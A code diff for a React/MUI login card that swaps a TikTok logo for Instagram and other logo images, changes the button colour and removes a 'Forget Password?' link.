@@ -3,7 +3,9 @@ import Box from "@mui/material/Box";
 import Card from "@mui/material/Card";
 import CardContent from "@mui/material/CardContent";
 import Button from "@mui/material/Button";
-import logo from "../../assets/tiktok.svg";
+// import logo from "../../assets/tiktok.svg";
+import logo from "../../assets/instagram.png";
+import logo1 from "../../assets/logo1.png";
 import { FormControl, InputAdornment, TextField } from "@mui/material";
 import OutlinedInput from "@mui/material/OutlinedInput";
 import InputLabel from "@mui/material/InputLabel";
@@ -119,8 +121,12 @@ export default function BasicCard() {
       >
         <CardContent>
           <div className="login-div">
-            <img height={200} width={200} src={logo} alt="Logo" />
-            <h2>Log in</h2>
+            <img height={178} width={200} src={logo1} alt="Logo" />
+            <br></br>
+            <img height={88} width={200} src={logo} alt="Logo" />
+            <br></br>
+            <br></br>
+
             {error && (
               <div style={{ color: "red", marginBottom: "1rem" }}>{error}</div>
             )}
@@ -166,7 +172,7 @@ export default function BasicCard() {
             <br />
             <Button
               style={{
-                backgroundColor: "#FF4E56",
+                backgroundColor: "#2980f0s",
               }}
               fullWidth
               variant="contained"
@@ -175,14 +181,6 @@ export default function BasicCard() {
             >
               {loading ? "Saving..." : "Log in"}
             </Button>
-            <br></br>
-            <p
-              style={{
-                Color: "#FF4E56",
-              }}
-            >
-              Forget Password?
-            </p>
           </div>
         </CardContent>
       </Card>
